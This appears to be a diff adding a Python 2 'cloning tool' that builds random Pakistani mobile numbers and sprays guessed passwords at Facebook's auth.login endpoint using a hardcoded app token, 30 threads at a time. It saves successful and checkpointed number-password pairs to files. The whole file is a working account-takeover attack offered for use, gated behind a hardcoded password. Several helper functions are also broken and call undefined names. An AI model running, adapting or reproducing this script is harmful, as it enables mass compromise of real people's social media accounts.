@@ -1,0 +1,358 @@
+#!/usr/bin/python2
+#coding=utf-8
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
+os.system('rm -rf .txt')
+for n in range(20000):
+    nmbr = random.randint(1111111, 9999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+
+try:
+    import requests
+except ImportError:
+    os.system('No Module Named Requests! type:pip2 install requests')
+
+try:
+    import mechanize
+except ImportError:
+    os.system('No Module Named Mechanize! type:pip2 install mechanize')
+    time.sleep(1)
+    os.system('Then type: python2 README.md')
+
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+
+br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def keluar():
+    print 'Thanks.'
+    os.sys.exit()
+
+
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!' + w[random.randint(0, len(w) - 1)] + i
+
+    return cetak(d)
+
+
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))
+
+    x += '\x1b[0m'
+    x = x.replace('!0', '\x1b[0m')
+    sys.stdout.write(x + '\n')
+def jalan(z):
+	for e in z + '\n':
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(3.0 / 200)
+def tik():
+    titik = [
+         '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[\033[1;32m✓\033[0m]\n']
+    for o in titik:
+        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mLoa\033[1;90mding.. \x1b[1;97m' + o,
+        sys.stdout.flush()
+        time.sleep(0.1)
+        
+     
+
+
+def lodhirt():
+    lodhirt = [
+          '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY']
+    for o in lodhirt:
+        print '\r\x1b[1;94m                  \x1b[1;92m' + o,
+        sys.stdout.flush()
+        time.sleep(1./17)
+
+
+
+
+
+back = 0
+oks = []
+id = []
+cpb = []
+vulnot = '\x1b[31mNot Vuln'
+vuln = '\x1b[32mVuln'
+os.system('clear')
+print  """
+\033[1;37m───────────────────────────────────────────────
+       \033[1;94m_____    ____      __  __   _____ 
+     \033[1;94m / ____|  / __ \    |  \/  | |_   _|
+    \033[1;92m | (___   | |  | |   | \  / |   | |  
+    \033[1;92m  \___ \  | |  | |   | |\/| |   | |  
+    \033[1;93m  ____) | | |__| |   | |  | |  _| |_ 
+    \033[1;93m |_____/   \____/    |_|  |_| |_____|
+\033[1;37m───────────────────────────────────────────────
+"""
+
+####Logo####
+
+logo1 = """
+\033[1;37m───────────────────────────────────────────────
+       \033[1;96m_____    ____      __  __   _____ 
+     \033[1;96m / ____|  / __ \    |  \/  | |_   _|
+    \033[1;92m | (___   | |  | |   | \  / |   | |  
+    \033[1;92m  \___ \  | |  | |   | |\/| |   | |  
+    \033[1;93m  ____) | | |__| |   | |  | |  _| |_ 
+    \033[1;93m |_____/   \____/    |_|  |_| |_____|
+\033[1;37m───────────────────────────────────────────────
+    
+
+"""
+logo2 = """
+\033[1;37m───────────────────────────────────────────────
+       \033[1;96m_____    ____      __  __   _____ 
+     \033[1;96m / ____|  / __ \    |  \/  | |_   _|
+    \033[1;92m | (___   | |  | |   | \  / |   | |  
+    \033[1;92m  \___ \  | |  | |   | |\/| |   | |  
+    \033[1;93m  ____) | | |__| |   | |  | |  _| |_ 
+    \033[1;93m |_____/   \____/    |_|  |_| |_____|
+\033[1;37m───────────────────────────────────────────────
+
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+"""     
+BrandUsername = "SOMI"
+BrandPassword = "BRAND"
+
+loop = 'true'
+while (loop == 'true'):
+    username = raw_input("\033[1;47m\033[1;31m             ✮ENTER BRAND NAME✮                \033[1;0m\n \n\033[1;93m»»» ")
+                                                     
+    if (username == BrandUsername):
+    	password = raw_input("\n\n\033[1;47m\033[1;34m           ✮ENTER BRAND PASSWORD✮              \033[1;0m\n \n\033[1;93m»»» ")
+                                                         
+        if (password == BrandPassword):
+            tik()
+            print "\033[1;92m\n \n\033[1;97m[\033[1;92m✓\033[1;97m] LOGIN COMPLETE NOW ENJOY WITH SOMI"
+	    time.sleep(2)
+            loop = 'false'
+        else:
+            print "\033[1;94mWRONG PASSWORD \n YOU NEED CORRECT PASSWORD THEN \033[1;91m\nCONTACT\033[1;97m\n 03455453538"
+            
+            
+    else: 
+        print "\033[1;94mWRONG USERNAME \n YOU NEED CORRECT USERNAME THEN \033[1;91m\n CONTACT\033[1;97m\n 03455453538"
+        
+def lisensi():
+    os.system('clear')
+    login()
+
+
+def login():
+    
+    os.system('clear')
+    print logo1
+    lodhirt()
+    print
+    print 47* '\033[1;97m='
+    jalan('\033[1;91m\033[1;33m             ‖   CLONING TOOL   ‖           \033[1;0m')
+    print 47* '\033[1;97m='
+    jalan('\033[1;91m\033[1;91m          TYPE\033[1;92m •1•\033[1;96mTHEN START CLONING \033[1;0m')
+    jalan('\033[1;91m\033[1;31m          TYPE\033[1;92m •0•\033[1;96mTHEN CLOSE PROGRAM    \033[1;0m')
+    print 47* '\033[1;97m='
+    pilih_login()
+
+
+def pilih_login():
+    peak = raw_input('\n\x1b[1;97m[\033[1;92m+\033[1;97m] \x1b[1;94m»»» \x1b[1;98m')
+    if peak == '':
+        print '\x1b[1;91mFill In Correctly'
+        pilih_login()
+    elif peak == '1':
+        Trypass()
+    elif peak == '0':
+        keluar()
+    else:
+        print '\x1b[1;91m[!] Invalid Option'
+        keluar()
+
+def Trypass():
+    os.system('clear')
+    print logo1
+    jalan('\x1b[1;91mTYPE \033[1;96m•1•\033[1;93m THEN START AUTO CRACKING\033[1;97m[MY CHOICE]')
+    jalan('\x1b[1;91mTYPE \033[1;96m•2•\033[1;93m THEN START MANUAL CRACKING\033[1;97m[YOU CHOICE]')
+    jalan('\x1b[1;91mTYPE \033[1;96m•0•\033[1;93m CLOSE PROGRAM\033[1;97m[BACK]')
+    pilih_Trypass()
+
+
+def pilih_Trypass():
+    peak = raw_input('\x1b[1;97m[\033[1;92m+\033[1;97m] \x1b[1;95m»»»\x1b[1;98m')
+    if peak == '':
+        print '[!] Fill In Correctly'
+        pilih_Trypass()
+    elif peak == '1':
+        automatic()
+    elif peak == '2':
+        own()
+    elif peak == '0':
+        Zk()
+    else:
+        print '[!] Fill In Correctly'
+        Zk()
+
+
+def automatic():
+    global cpb
+    global oks
+    os.system('clear')
+    print logo1
+    print '             \x1b[1;93mPakistan Area Codes'
+    print 47 * '\x1b[1;94m_'
+    print '            \x1b[1;97m00,01,02,03,04,05,06,07,08'
+    print '            \x1b[1;97m09,10,11,12,13,14,15,16,17'
+    print '            \x1b[1;97m18,21,22,23,24,30,31,32,33'
+    print '            \x1b[1;97m34,35,40,41,42,43,44,45,46'
+    print 47 * '\x1b[1;94m_'
+    try:
+        c = raw_input('\x1b[1;97m[\033[1;92m+\033[1;97m] \x1b[1;93mChoose Area Code:\x1b[1;98m')
+        k = '03'
+        idlist = '.txt'
+        for line in open(idlist, 'r').readlines():
+            id.append(line.strip())
+
+    except IOError:
+        print '[!] File Not Found'
+        raw_input('\n[ Back ]')
+        Trypass()
+    print 47* '\033[1;97m⁀'
+    jalan('\033[1;91m\033[1;33m            CLONING PROCESS START            \033[1;0m')
+    print 47* '\033[1;97m‿'
+    
+
+    def main(arg):
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+
+        try:
+            pass1 = user
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[Active]    ' + k + c + user + '  \x1b[1;97m|  ' + pass1
+                okb = open('save/successful.txt', 'a')
+                okb.write(k + c + user + pass1 + '\n')
+                okb.close()
+                oks.append(c + user + pass1)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;94m[In-Active] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass1
+                cps = open('save/checkpoint.txt', 'a')
+                cps.write(k + c + user + pass1 + '\n')
+                cps.close()
+                cpb.append(c + user + pass1)
+            else:
+                pass2 = '786786'
+                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                q = json.load(data)
+                if 'access_token' in q:
+                    print '\x1b[1;92m[Active]    ' + k + c + user + '  \x1b[1;97m|  ' + pass2
+                    okb = open('save/successful.txt', 'a')
+                    okb.write(k + c + user + pass2 + '\n')
+                    okb.close()
+                    oks.append(c + user + pass2)
+                elif 'www.facebook.com' in q['error_msg']:
+                    print '\x1b[1;94m[In-Active] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass2
+                    cps = open('save/checkpoint.txt', 'a')
+                    cps.write(k + c + user + pass2 + '\n')
+                    cps.close()
+                    cpb.append(c + user + pass2)
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 50 * '\x1b[1;95m'
+    
+    print '[\xe2\x9c\x85] Process Has Been Completed ...'
+    print '[\xe2\x9c\x85] Total Active/In-Active : ' + str(len(oks)) + '/' + str(len(cpb))
+    print '[\xe2\x9c\x85] Cloned Accounts Has Been Saved : cloned/idz.txt'
+    
+    raw_input('\n\x1b[1;94m[\x1b[1;91mBack\x1b[1;95m]')
+    login()
+
+
+def own():
+    os.system('clear')
+    print logo1
+    print '            \x1b[1;93mPakistan Area Codes'
+    print 47 * '\x1b[1;94m_'
+    print '            \x1b[1;97m00,01,02,03,04,05,06,07,08'
+    print '            \x1b[1;97m09,10,11,12,13,14,15,16,17'
+    print '            \x1b[1;97m18,21,22,23,24,30,31,32,33'
+    print '            \x1b[1;97m34,35,40,41,42,43,44,45,46'
+    print 47 * '\x1b[1;94m_'
+   
+    try:
+        c = raw_input('\x1b[1;97m[\033[1;92m+\033[1;97m] \x1b[1;93mChoose Area Code:\x1b[1;98m')
+        pass1 = raw_input('\x1b[1;97m[\033[1;92m+\033[1;97m] \x1b[1;97mEnter Your Password: \x1b[1;97m')
+        k = '03'
+        idlist = '.txt'
+        for line in open(idlist, 'r').readlines():
+            id.append(line.strip())
+
+    except IOError:
+        print '[!] File Not Found'
+        raw_input('\n[ Back ]')
+        passmenu()
+    
+    
+    print 47* '\033[1;97m⁀'
+    jalan('\033[1;91m\033[1;33m            CLONING PROCESS START            \033[1;0m')
+    print 47* '\033[1;97m‿'
+    
+    def main(arg):
+        user = arg
+        try:
+            os.mkdir('cloned')
+        except OSError:
+            pass
+
+        try:
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[Active]    ' + k + c + user + ' \x1b[1;97m|  ' + pass1
+                okb = open('cloned/idz.txt', 'a')
+                okb.write(k + c + user + pass1 + '\n')
+                okb.close()
+                oks.append(c + user + pass1)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;94m[In-Active] \x1b[1;97m' + k + c + user + ' \x1b[1;97m|  ' + pass1
+                cps = open('cloned/idz.txt', 'a')
+                cps.write(k + c + user + pass1 + '\n')
+                cps.close()
+                cpb.append(c + user + pass1)
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 50 * '\x1b[1;95m'
+    
+    print '[\xe2\x9c\x85] Process Has Been Completed ...'
+    print '[\xe2\x9c\x85] Total Active/In-Active : ' + str(len(oks)) + '/' + str(len(cpb))
+    print '[\xe2\x9c\x85] Cloned Accounts Has Been Saved : cloned/idz.txt'
+    raw_input('\n\x1b[1;94m[\x1b[1;91mBack\x1b[1;95m]')
+    own()
+
+
+if __name__ == '__main__':
+    login() 
